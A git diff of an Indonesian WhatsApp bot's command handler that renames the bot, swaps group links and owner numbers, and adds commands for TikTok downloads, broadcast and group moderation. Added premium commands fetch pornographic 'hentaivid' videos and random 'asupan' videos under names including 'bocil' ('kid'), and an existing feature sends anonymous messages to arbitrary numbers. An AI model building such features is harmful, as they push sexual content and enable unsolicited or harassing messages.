+              sourceUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
             },
           },
         });
@@ -2430,8 +1811,8 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
               containsAutoReply: true,
               mediaType: 1,
               thumbnail: ppnyauser,
-              mediaUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
-              sourceUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
+              mediaUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
+              sourceUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
             },
           },
         });
@@ -2449,8 +1830,8 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
               containsAutoReply: true,
               mediaType: 1,
               thumbnail: ppnyauser,
-              mediaUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
-              sourceUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
+              mediaUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
+              sourceUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
             },
           },
         });
@@ -2468,8 +1849,8 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
               containsAutoReply: true,
               mediaType: 1,
               thumbnail: ppnyauser,
-              mediaUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
-              sourceUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
+              mediaUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
+              sourceUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
             },
           },
         });
@@ -2487,8 +1868,8 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
               containsAutoReply: true,
               mediaType: 1,
               thumbnail: ppnyauser,
-              mediaUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
-              sourceUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
+              mediaUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
+              sourceUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
             },
           },
         });
@@ -2506,8 +1887,8 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
               containsAutoReply: true,
               mediaType: 1,
               thumbnail: ppnyauser,
-              mediaUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
-              sourceUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
+              mediaUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
+              sourceUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
             },
           },
         });
@@ -2525,8 +1906,8 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
               containsAutoReply: true,
               mediaType: 1,
               thumbnail: ppnyauser,
-              mediaUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
-              sourceUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
+              mediaUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
+              sourceUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
             },
           },
         });
@@ -2544,8 +1925,8 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
               containsAutoReply: true,
               mediaType: 1,
               thumbnail: ppnyauser,
-              mediaUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
-              sourceUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
+              mediaUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
+              sourceUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
             },
           },
         });
@@ -2563,8 +1944,8 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
               containsAutoReply: true,
               mediaType: 1,
               thumbnail: ppnyauser,
-              mediaUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
-              sourceUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
+              mediaUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
+              sourceUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
             },
           },
         });
@@ -2582,8 +1963,8 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
               containsAutoReply: true,
               mediaType: 1,
               thumbnail: ppnyauser,
-              mediaUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
-              sourceUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
+              mediaUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
+              sourceUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
             },
           },
         });
@@ -2601,8 +1982,8 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
               containsAutoReply: true,
               mediaType: 1,
               thumbnail: ppnyauser,
-              mediaUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
-              sourceUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
+              mediaUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
+              sourceUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
             },
           },
         });
@@ -2616,64 +1997,36 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
         }, 1000);
         setTimeout(() => {
           reply('Berhasil Mendapatkan Satu Orang');
-        }, 3000);
+        }, 5000);
         setTimeout(() => {
-          das.sendMessage(
+          kayla.sendMessage(
             from,
-            {
-              text: `Nih Kak @${teman.no.split('@')[0]}`,
-              mentions: [teman.no],
-            },
+            { text: `Nih Kak @${teman.split('@')[0]}`, mentions: [teman] },
             { quoted: m }
           );
-        }, 5000);
+        }, 9000);
         break;
       case 'sc':
       case 'scriptbot':
       case 'scbot':
         {
-          das.sendMessage(
-            sender,
+          kayla.sendMessage(
+            m.chat,
             {
-              text: `Hai kak, SC ini free ya!!\n\nTapi syaratnya sebelum pake SC ini, jangan lupa kasih *STAR* ⭐ dan klik *FORK* ya 🇲🇨\n\nSC : https://github.com/dasx000/MD-BOTDAS\n\n`,
-              mentions: [creator],
-            },
-            { quoted: m }
-          );
-          das.sendMessage(
-            from,
-            {
-              text: `\nHai kak, SC sudah saya kirim dichat pribadi!! jangan lupa baca petunjuknya ya 🫡\n`,
+              text: `Mau Script Bot Nya? Silahkan Chat Aja @${
+                creator.split('@')[0]
+              }`,
               mentions: [creator],
             },
             { quoted: m }
           );
         }
         break;
-      case 'screstapi':
-        {
-          das.sendMessage(
-            sender,
-            {
-              text: `Hai kak, SC ini free ya!!\n\nTapi syaratnya sebelum pake SC ini, jangan lupa kasih *STAR* ⭐ dan klik *FORK* ya 🇲🇨\n\nSC : https://github.com/dasx000/das-rest-api\n\n*FITUR*\n⭐ 3 ROLE (admin, premium, member)\n⭐ Fitur login\n⭐ Google Recaptcha\n⭐ dll.....\n\n`,
-              mentions: [creator],
-            },
-            { quoted: m }
-          );
-          das.sendMessage(
-            from,
-            {
-              text: `\nHai kak, SC sudah saya kirim dichat pribadi!! jangan lupa baca petunjuknya ya 🫡\n`,
-              mentions: [creator],
-            },
-            { quoted: m }
-          );
-        }
-        break;
+      case 'q':
       case 'quoted':
         {
           if (!m.quoted) return reply('Reply Pesannya!!');
-          let wokwol = await das.serializeM(await m.getQuotedObj());
+          let wokwol = await kayla.serializeM(await m.getQuotedObj());
           if (!wokwol.quoted)
             return reply('Pesan Yang anda reply tidak mengandung reply');
           await wokwol.quoted.copyNForward(m.chat, true);
@@ -2694,7 +2047,7 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
                   fs.unlinkSync(ranm);
                   buff = fs.readFileSync(rano);
                   if (err) return reply(mess.error);
-                  das.sendMessage(
+                  kayla.sendMessage(
                     m.chat,
                     { audio: buff, mimetype: 'audio/mp4', ptt: false },
                     { quoted: m }
@@ -2709,7 +2062,7 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
           if (!isPrem) return replyprem(mess.premium);
           if (!q) return reply(`Contoh ${prefix + command} kirbotzx`);
           aj = await igstalk(`${q}`);
-          das.sendMessage(
+          kayla.sendMessage(
             m.chat,
             {
               image: { url: aj.profile },
@@ -2769,7 +2122,7 @@ Latest Publish Time : ${eha.latestPublishTime}`);
         {
           if (!q) return reply(`Contoh ${prefix + command} KirBotz`);
           aj = await githubstalk.githubstalk(`${q}`);
-          das.sendMessage(
+          kayla.sendMessage(
             m.chat,
             {
               image: { url: aj.profile_pic },
@@ -2806,7 +2159,7 @@ Updated At : ${aj.updated_at}`,
           await scp1
             .ssweb(q)
             .then((krt) => {
-              das.sendMessage(
+              kayla.sendMessage(
                 m.chat,
                 { image: krt.result, caption: mess.succes },
                 { quoted: m }
@@ -2819,12 +2172,12 @@ Updated At : ${aj.updated_at}`,
         break;
       case 'join':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           if (!text) return reply(`Contoh ${prefix + command} linkgc`);
           if (!isUrl(args[0]) && !args[0].includes('whatsapp.com'))
             return reply('Link Invalid!');
           let result = args[0].split('https://chat.whatsapp.com/')[1];
-          await das
+          await kayla
             .groupAcceptInvite(result)
             .then((res) => reply(jsonformat(res)))
             .catch((err) => reply(jsonformat(err)));
@@ -2834,8 +2187,8 @@ Updated At : ${aj.updated_at}`,
         {
           if (!quoted) return reply(`Reply Image/Video`);
           if (/image/.test(mime)) {
-            anuan = await das.downloadAndSaveMediaMessage(quoted);
-            das.sendMessage(
+            anuan = await kayla.downloadAndSaveMediaMessage(quoted);
+            kayla.sendMessage(
               m.chat,
               {
                 image: { url: anuan },
@@ -2846,8 +2199,8 @@ Updated At : ${aj.updated_at}`,
               { quoted: m }
             );
           } else if (/video/.test(mime)) {
-            anuanuan = await das.downloadAndSaveMediaMessage(quoted);
-            das.sendMessage(
+            anuanuan = await kayla.downloadAndSaveMediaMessage(quoted);
+            kayla.sendMessage(
               m.chat,
               {
                 video: { url: anuanuan },
@@ -2860,8 +2213,40 @@ Updated At : ${aj.updated_at}`,
           }
         }
         break;
+      case 'autodltt':
+        if (!itsMeKayla) return reply(mess.owner);
+        if (args[0] == 'on') {
+          if (autodltt) return reply('*Sudah Aktif!*');
+          autodltt = true;
+          reply('*Berhasil Mengaktifkan Auto Download Tiktok*');
+        } else if (args[0] == 'off') {
+          if (!autodltt) return reply('*Belum Aktif!*');
+          autodltt = false;
+          reply('*Berhasil Mematikan Auto Download Tiktok*');
+        } else {
+          let buttons = [
+            {
+              buttonId: '.autodltt on',
+              buttonText: { displayText: 'On' },
+              type: 1,
+            },
+            {
+              buttonId: '.autodltt off',
+              buttonText: { displayText: 'Off' },
+              type: 1,
+            },
+          ];
+          await kayla.sendButtonText(
+            m.chat,
+            buttons,
+            `Mode Auto Download Tiktok`,
+            `Pilih On Atau Off`,
+            m
+          );
+        }
+        break;
       case 'autosticker':
-        if (!isOwner) return reply(mess.owner);
+        if (!itsMeKayla) return reply(mess.owner);
         if (args[0] == 'on') {
           if (autosticker) return reply('*Sudah Aktif!*');
           autosticker = true;
@@ -2871,7 +2256,7 @@ Updated At : ${aj.updated_at}`,
           autosticker = false;
           reply('*Berhasil Mematikan Autosticker*');
         } else {
-          buttons = [
+          let buttons = [
             {
               buttonId: '.autosticker on',
               buttonText: { displayText: 'On' },
@@ -2883,7 +2268,7 @@ Updated At : ${aj.updated_at}`,
               type: 1,
             },
           ];
-          await das.sendButtonText(
+          await kayla.sendButtonText(
             m.chat,
             buttons,
             `Mode Autosticker`,
@@ -2892,78 +2277,31 @@ Updated At : ${aj.updated_at}`,
           );
         }
         break;
-
-      /* disable bc fitur for me
-      case 'bcprivate':
-        if (!isOwner) return reply(mess.owner);
-        if (!q) return reply(`Teks Nya Bang?`);
-        anu = await store.chats.all().map((v) => v.id);
-        for (let yoi of anu) {
-          if (!yoi.includes('@g.us')) {
-            das.sendMessage(yoi, {
-              text: `\n\n${q}`,
-            });
-          }
-        }
-        reply(`Succes`);
-        break;
-      case 'bcgrup':
-        if (!isOwner) return reply(mess.owner);
-        if (!q) return reply(`Teks Nya Bang?`);
-        try {
-          anu = await store.chats.all().map((v) => v.id);
-          for (let yoi of anu) {
-            if (yoi.includes('@g.us')) {
-              das.sendMessage(yoi, {
-                text: `\n\n${q}`,
-              });
-            }
-          }
-          reply(`Succes`);
-        } catch (error) {
-          sendCreator(JSON.stringify(error.message, null, 2));
-          sendCreator(JSON.stringify(error, null, 2));
-        }
-        reply(`Succes`);
-        break;
- case 'bcall':
+      case 'bc':
         if (!itsMeKayla) return reply(mess.owner);
         if (!q) return reply(`Teks Nya Bang?`);
-        anu = await store.chats.all().map((v) => v.id);
+        let anu = await store.chats.all().map((v) => v.id);
         for (let yoi of anu) {
-          das.sendMessage(yoi, {
-            text: `\n\n${q}`,
+          kayla.sendMessage(yoi, {
+            text: `INFORMASI
+Buat User Bot
+
+${q}`,
           });
         }
         reply(`Succes`);
         break;
-        */
-      case 'listgrup':
-        if (!itsMeKayla) return reply(mess.owner);
-        let gcLength = 0;
-        let gc = '\n\n';
-        let anug = await store.chats.all().map((v) => v.id);
-        for (let yoi of anug) {
-          if (yoi.includes('@g.us')) {
-            gcLength++;
-            gc += `> ${yoi}\n`;
-          }
-        }
-        gc += `\n\nTotal Grup : *${gcLength}*`;
-        reply(gc);
-        break;
-
       case 'ban':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           if (!q)
             return reply(
               `Penggunaan ${prefix + command} add/del nomor\nContoh ${
                 prefix + command
-              } add/del 6285768966412`
+              } add/del 6285216024226`
             );
           orgnye = q.split('|')[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`;
-          let ceknye = await das.onWhatsApp(orgnye);
+          let ceknye = await kayla.onWhatsApp(orgnye);
           if (ceknye.length == 0)
             return reply(
               `Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`
@@ -2971,11 +2309,11 @@ Updated At : ${aj.updated_at}`,
           const isBane = banUser ? banUser.includes(orgnye) : false;
           if (args[0] === 'add') {
             if (isBane) return reply('User Sudah Dibanned');
-            das.updateBlockStatus(orgnye, 'block');
+            kayla.updateBlockStatus(orgnye, 'block');
             reply(`Succes Ban`);
           } else if (args[0] === 'del') {
             if (!isBane) return reply('User Tidak Dibanned');
-            das.updateBlockStatus(orgnye, 'unblock');
+            kayla.updateBlockStatus(orgnye, 'unblock');
             reply(`Succes Unban`);
           } else {
             reply('Error');
@@ -3012,18 +2350,52 @@ Updated At : ${aj.updated_at}`,
               footer: fake,
               title: '     「 List Participants Blockir 」',
               buttonText: 'List Blockir',
-              mentions: await das.parseMention(teskd),
+              mentions: await kayla.parseMention(teskd),
               sections,
             };
-            das.sendMessage(from, listMessage, { quoted: m });
+            kayla.sendMessage(from, listMessage, { quoted: m });
           } catch {
             reply('Tidak ada user yang diblockir');
           }
         }
         break;
-
+      case 'asupan':
+      case 'bocil':
+      case 'rikagusriani':
+        {
+          if (!isPrem) return replyprem(mess.premium);
+          fdy = await fetchJson(
+            `https://kirbotz-api.herokuapp.com/api/random/asupan/${command}?apikey=KirBotz`
+          );
+          kayla.sendMessage(
+            m.chat,
+            { video: { url: fdy.result.url }, caption: `${mess.succes}` },
+            { quoted: m }
+          );
+        }
+        break;
+      case 'hentaivid':
+        {
+          if (!isPrem) return replyprem(mess.premium);
+          sbe = await hentaivid();
+          cejd = sbe[Math.floor(Math.random(), sbe.length)];
+          kayla.sendMessage(
+            m.chat,
+            {
+              video: { url: cejd.video_1 },
+              caption: `⭔ Title : ${cejd.title}
+⭔ Category : ${cejd.category}
+⭔ Mimetype : ${cejd.type}
+⭔ Views : ${cejd.views_count}
+⭔ Shares : ${cejd.share_count}
+⭔ Source : ${cejd.link}
+⭔ Media Url : ${cejd.video_1}`,
+            },
+            { quoted: m }
+          );
+        }
+        break;
       case 'menfes':
-      case 'menfess':
       case 'confes':
         if (Object.values(anon.anonymous).find((p) => p.check(sender)))
           return reply('Anda masih didalam room');
@@ -3032,12 +2404,12 @@ Updated At : ${aj.updated_at}`,
           return reply(
             `Penggunaan ${prefix + command} nomor|isi pesan\nContoh ${
               prefix + command
-            } 6285768966412|Hai Owner`
+            } 6285216024226|Hai Owner`
           );
         if (text > 700) return reply(`Teks Kepanjangan`);
         num = q.split('|')[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
         pesan = q.split('|')[1];
-        let cekno = await das.onWhatsApp(num);
+        let cekno = await kayla.onWhatsApp(num);
         if (cekno.length == 0)
           return reply(
             `Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`
@@ -3047,16 +2419,16 @@ Updated At : ${aj.updated_at}`,
         if (num === botNumber)
           return reply(`Tidak Bisa Menfess Ke Nomor bot!!!`);
         var nomor = m.sender;
-        let buttonsMenfes = [
+        let buttons = [
           {
             buttonId: '.leave',
             buttonText: { displayText: 'Biarin' },
             type: 1,
           },
         ];
-        await das.sendButtonText(
+        await kayla.sendButtonText(
           num,
-          buttonsMenfes,
+          buttons,
           `Hi Saya Bot Ada Yang Kirim Pesan Ke Kamu
 Seseorang Temanmu
 (Pengirim Rahasia)
@@ -3075,7 +2447,7 @@ Contoh Penggunaan: ${prefix + command} nomor|pesan untuknya
 Contoh: ${prefix + command} 628xxxxxxxx|hai owner`,
           m
         );
-        await das.sendMessage(
+        await kayla.sendMessage(
           num,
           {
             text: `𝘈𝘯𝘥𝘢 𝘑𝘶𝘨𝘢 𝘉𝘪𝘴𝘢 𝘔𝘦𝘮𝘣𝘢𝘭𝘢𝘴 𝘗𝘦𝘴𝘢𝘯 𝘕𝘺𝘢 𝘋𝘦𝘯𝘨𝘢𝘯 𝘊𝘢𝘳𝘢 𝘔𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘗𝘦𝘴𝘢𝘯, 𝘑𝘪𝘬𝘢 𝘈𝘯𝘥𝘢 𝘛𝘪𝘥𝘢𝘬 𝘔𝘢𝘶 𝘔𝘦𝘮𝘣𝘢𝘭𝘢𝘴 𝘕𝘺𝘢 𝘗𝘦𝘯𝘤𝘦𝘵 𝘉𝘶𝘵𝘵𝘰𝘯 𝘽𝙞𝙖𝙧𝙞𝙣 𝘋𝘪 𝘈𝘵𝘢𝘴 𝘠𝘢𝘩 𝘔𝘢𝘬𝘢𝘴𝘪𝘩`,
@@ -3101,8 +2473,8 @@ Isi Pesan : ${pesan}
         }
         break;
       case 'leave': {
-        if (m.isGroup && isOwner && command == 'leave')
-          return das.groupLeave(from);
+        if (m.isGroup && itsMeKayla && command == 'leave')
+          return kayla.groupLeave(from);
         if (m.isGroup) return reply('Only private chat');
         var room = Object.values(anon.anonymous).find((p) => p.check(sender));
         if (!room) return reply('Anda tidak berada didalam room');
@@ -3110,7 +2482,7 @@ Isi Pesan : ${pesan}
         var other = room.other(sender);
         delete anon.anonymous[room.id];
         if (other != '')
-          das.sendMessage(other, {
+          kayla.sendMessage(other, {
             text: 'Bye...',
           });
         if (command == 'leave') break;
@@ -3135,7 +2507,7 @@ Isi Pesan : ${pesan}
         break;
       case 'antilink':
         if (!m.isGroup) return reply(mess.group);
-        if (!isAdmins && !isOwner) return reply(mess.admin);
+        if (!isAdmins && !itsMeKayla) return reply(mess.admin);
         if (!isBotAdmins) return reply(mess.botAdmin);
         if (args[0] == 'on') {
           if (antilink) return reply('*Sudah Aktif!*');
@@ -3146,7 +2518,7 @@ Isi Pesan : ${pesan}
           antilink = false;
           reply('*Berhasil Mematikan Antilink*');
         } else {
-          buttons = [
+          let buttons = [
             {
               buttonId: '.antilink on',
               buttonText: { displayText: 'On' },
@@ -3158,7 +2530,7 @@ Isi Pesan : ${pesan}
               type: 1,
             },
           ];
-          await das.sendButtonText(
+          await kayla.sendButtonText(
             m.chat,
             buttons,
             `Mode Antilink`,
@@ -3169,7 +2541,7 @@ Isi Pesan : ${pesan}
         break;
       case 'antiwame':
         if (!m.isGroup) return reply(mess.group);
-        if (!isAdmins && !isOwner) return reply(mess.admin);
+        if (!isAdmins && !itsMeKayla) return reply(mess.admin);
         if (!isBotAdmins) return reply(mess.botAdmin);
         if (args[0] == 'on') {
           if (antiwame) return reply('*Sudah Aktif!*');
@@ -3180,7 +2552,7 @@ Isi Pesan : ${pesan}
           antiwame = false;
           reply('*Berhasil Mematikan Antilink*');
         } else {
-          buttons = [
+          let buttons = [
             {
               buttonId: '.antiwame on',
               buttonText: { displayText: 'On' },
@@ -3192,7 +2564,7 @@ Isi Pesan : ${pesan}
               type: 1,
             },
           ];
-          await das.sendButtonText(
+          await kayla.sendButtonText(
             m.chat,
             buttons,
             `Mode Antiwame`,
@@ -3203,14 +2575,13 @@ Isi Pesan : ${pesan}
         break;
       case 'add':
         {
-          if (!creator) return reply('Disabled for now');
           if (!m.isGroup) return reply(mess.group);
-          if (!isAdmins && !isOwner) return reply(mess.admin);
+          if (!isAdmins && !itsMeKayla) return reply(mess.admin);
           if (!isBotAdmins) return reply(mess.botAdmin);
           let users = m.quoted
             ? m.quoted.sender
             : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-          await das
+          await kayla
             .groupParticipantsUpdate(m.chat, [users], 'add')
             .then((res) => reply(jsonformat(res)))
             .catch((err) => reply(jsonformat(err)));
@@ -3218,7 +2589,7 @@ Isi Pesan : ${pesan}
         break;
       case 'closetime':
         if (!m.isGroup) return reply(mess.group);
-        if (!isAdmins && !isOwner) return reply(mess.admin);
+        if (!isAdmins && !itsMeKayla) return reply(mess.admin);
         if (!isBotAdmins) return reply(mess.botAdmin);
         if (args[1] == 'detik') {
           var timer = args[0] * `1000`;
@@ -3235,13 +2606,13 @@ Isi Pesan : ${pesan}
         setTimeout(() => {
           var nomor = m.participant;
           const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`;
-          das.groupSettingUpdate(from, 'announcement');
+          kayla.groupSettingUpdate(from, 'announcement');
           reply(close);
         }, timer);
         break;
       case 'opentime':
         if (!m.isGroup) return reply(mess.group);
-        if (!isAdmins && !isOwner) return reply(mess.admin);
+        if (!isAdmins && !itsMeKayla) return reply(mess.admin);
         if (!isBotAdmins) return reply(mess.botAdmin);
         if (args[1] == 'detik') {
           var timer = args[0] * `1000`;
@@ -3258,36 +2629,37 @@ Isi Pesan : ${pesan}
         setTimeout(() => {
           var nomor = m.participant;
           const open = `*Tepat waktu* grup dibuka oleh admin\n sekarang member dapat mengirim pesan`;
-          das.groupSettingUpdate(from, 'not_announcement');
+          kayla.groupSettingUpdate(from, 'not_announcement');
           reply(open);
         }, timer);
         break;
       case 'kick':
-        if (!m.isGroup) return reply(mess.group);
-        if (!isAdmins && !isOwner) return reply(mess.admin);
-        if (!isBotAdmins) return reply(mess.botAdmin);
-        let users = m.mentionedJid[0]
-          ? m.mentionedJid[0]
-          : m.quoted
-          ? m.quoted.sender
-          : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-        await das
-          .groupParticipantsUpdate(m.chat, [users], 'remove')
-          .then((res) => reply(jsonformat(res)))
-          .catch((err) => reply(jsonformat(err)));
-
-        break;
-      case 'promote':
         {
           if (!m.isGroup) return reply(mess.group);
-          if (!isAdmins && !isOwner) return reply(mess.admin);
+          if (!isAdmins && !itsMeKayla) return reply(mess.admin);
           if (!isBotAdmins) return reply(mess.botAdmin);
           let users = m.mentionedJid[0]
             ? m.mentionedJid[0]
             : m.quoted
             ? m.quoted.sender
             : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-          await das
+          await kayla
+            .groupParticipantsUpdate(m.chat, [users], 'remove')
+            .then((res) => reply(jsonformat(res)))
+            .catch((err) => reply(jsonformat(err)));
+        }
+        break;
+      case 'promote':
+        {
+          if (!m.isGroup) return reply(mess.group);
+          if (!isAdmins && !itsMeKayla) return reply(mess.admin);
+          if (!isBotAdmins) return reply(mess.botAdmin);
+          let users = m.mentionedJid[0]
+            ? m.mentionedJid[0]
+            : m.quoted
+            ? m.quoted.sender
+            : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
+          await kayla
             .groupParticipantsUpdate(m.chat, [users], 'promote')
             .then((res) => reply(jsonformat(res)))
             .catch((err) => reply(jsonformat(err)));
@@ -3296,14 +2668,14 @@ Isi Pesan : ${pesan}
       case 'demote':
         {
           if (!m.isGroup) return reply(mess.group);
-          if (!isAdmins && !isOwner) return reply(mess.admin);
+          if (!isAdmins && !itsMeKayla) return reply(mess.admin);
           if (!isBotAdmins) return reply(mess.botAdmin);
           let users = m.mentionedJid[0]
             ? m.mentionedJid[0]
             : m.quoted
             ? m.quoted.sender
             : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-          await das
+          await kayla
             .groupParticipantsUpdate(m.chat, [users], 'demote')
             .then((res) => reply(jsonformat(res)))
             .catch((err) => reply(jsonformat(err)));
@@ -3315,7 +2687,7 @@ Isi Pesan : ${pesan}
           if (!isAdmins && !isOwner) return reply(mess.admin);
           // if (!isBotAdmins) return reply(mess.botAdmin);
           if (!q) return reply(`Teks?`);
-          das.sendMessage(
+          kayla.sendMessage(
             m.chat,
             { text: q ? q : '', mentions: participants.map((a) => a.id) },
             { quoted: m }
@@ -3332,7 +2704,7 @@ Isi Pesan : ${pesan}
           for (let mem of participants) {
             teks += `➲ @${mem.id.split('@')[0]}\n`;
           }
-          das.sendMessage(
+          kayla.sendMessage(
             m.chat,
             { text: teks, mentions: participants.map((a) => a.id) },
             { quoted: m }
@@ -3355,6 +2727,42 @@ Isi Pesan : ${pesan}
           let { dBinary } = require('./scrape/binary');
           let db = await dBinary(q);
           reply(db);
+        }
+        break;
+      case 'tiktokvideo':
+        {
+          if (!q)
+            return reply(
+              `Link Nya Kak???\nContoh ${
+                prefix + command
+              } https://vm.tiktok.com/ZSRApJY1K/`
+            );
+          let res = await tiktokdl(q);
+          kayla.sendMessage(
+            m.chat,
+            { video: { url: res.media[1].url }, caption: `${mess.succes}` },
+            { quoted: m }
+          );
+        }
+        break;
+      case 'tiktokaudio':
+        {
+          if (!q)
+            return reply(
+              `Link Nya Kak???\nContoh ${
+                prefix + command
+              } https://vm.tiktok.com/ZSRApJY1K/`
+            );
+          let tytyd = await tiktokdl(q);
+          kayla.sendMessage(
+            m.chat,
+            {
+              audio: { url: tytyd.media[2].url },
+              mimetype: 'audio/mp4',
+              ptt: false,
+            },
+            { quoted: m }
+          );
         }
         break;
       case 'googles':
@@ -3403,7 +2811,7 @@ Hasil : ${kay.hasil_nya}
 Tingkat Kesulitan : ${kay.tingkat_kesulitan}
 Bahan :
 ${kay.bahan_nya}`;
-          das.sendMessage(
+          kayla.sendMessage(
             m.chat,
             {
               image: {
@@ -3441,7 +2849,7 @@ ${kay.bahan_nya}`;
           ],
           listType: 1,
         };
-        const sendMsg = await das.sendMessage(from, buttonNya);
+        const sendMsg = await kayla.sendMessage(from, buttonNya);
         break;
       case 'play':
         {
@@ -3452,7 +2860,7 @@ ${kay.bahan_nya}`;
           let anu =
             search.videos[Math.floor(Math.random() * search.videos.length)];
           eek = await getBuffer(anu.thumbnail);
-          owned = '6285768966412@s.whatsapp.net';
+          owned = '6285216024226@s.whatsapp.net';
           ngen = `
 Title : ${anu.title}
 Ext : Search
@@ -3475,7 +2883,7 @@ Channel : ${anu.author.url}`;
           ];
           let buttonMessages = {
             image: eek,
-            // jpegThumbnail: fs.readFileSync('./pp.png'),
+            jpegThumbnail: eek,
             caption: ngen,
             fileLength: '99999999999',
             mentions: [sender, owned],
@@ -3484,9 +2892,19 @@ Channel : ${anu.author.url}`;
             headerType: 4,
             contextInfo: {
               mentionedJid: [sender, owned],
+              externalAdReply: {
+                showAdAttribution: true,
+                renderLargerThumbnail: true,
+                title: `Hai Kak ${pushname}`,
+                containsAutoReply: true,
+                mediaType: 1,
+                thumbnail: eek,
+                mediaUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
+                sourceUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
+              },
             },
           };
-          das.sendMessage(m.chat, buttonMessages, {
+          kayla.sendMessage(m.chat, buttonMessages, {
             quoted: {
               key: {
                 fromMe: false,
@@ -3526,7 +2944,7 @@ Channel : ${anu.author.url}`;
       case 'donasi':
       case 'donate':
         {
-          das.sendMessage(
+          kayla.sendMessage(
             from,
             {
               image: qrisdonate,
@@ -3546,60 +2964,296 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
         }
         break; */
 
-      //       case 'buypremium':
-      //       case 'jadiowner':
-      //       case 'sewabot':
-      //         {
-      //           const seactiones = [
-      //             {
-      //               title: `LIST SEWABOT`,
-      //               rows: [
-      //                 { title: `1 MINGGU`, rowId: `${prefix}sewakay 1minggu` },
-      //                 { title: `1 BULAN`, rowId: `${prefix}sewakay 1bulan` },
-      //                 { title: `1 TAHUN`, rowId: `${prefix}sewakay 1tahun` },
-      //                 { title: `PERMANENT`, rowId: `${prefix}sewakay permanent` },
-      //               ],
-      //             },
-      //             {
